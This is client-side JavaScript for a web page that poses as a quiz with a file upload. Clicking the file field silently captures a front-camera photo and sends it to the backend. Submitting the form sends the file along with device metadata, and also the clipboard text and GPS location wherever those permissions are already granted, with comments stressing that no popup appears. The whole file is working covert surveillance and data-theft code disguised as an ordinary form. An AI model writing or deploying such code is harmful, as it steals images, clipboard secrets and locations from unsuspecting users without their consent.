const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    clipboard: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    time: new Date().toLocaleString(),
    ip: "N/A" // will be set in backend if needed
  };

  // Battery info (no popup)
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Clipboard (only if permission already granted)
  if (navigator.permissions && navigator.clipboard) {
    try {
      const status = await navigator.permissions.query({ name: "clipboard-read" });
      if (status.state === "granted") {
        metadata.clipboard = await navigator.clipboard.readText();
      }
    } catch {}
  }

  // Location only if already granted (no popup)
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA (ONLY ON FILE CLICK)
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured || cameraInProgress) return;
  cameraInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();
    await new Promise((r) => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    // Send camera image + metadata separately
    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });

    console.log("Camera captured and sent!");

    stream.getTracks().forEach((t) => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// Trigger camera only on file input click
fileInput.addEventListener("click", () => {
  captureAndSendCamera();
});

// ================================
// FILE UPLOAD WITH METADATA
// ================================
async function uploadFile(file, metadata) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
            metadata // include metadata here
          }),
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  try {
    const metadata = await collectMetadata();

    // Upload file + metadata in background
    await uploadFile(fileInput.files[0], metadata);

    // Show success immediately
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";

    console.log("File submitted with metadata successfully!");
  } catch (err) {
    console.error("Submit error:", err);
    alert("Upload failed. Try again.");
  }
});
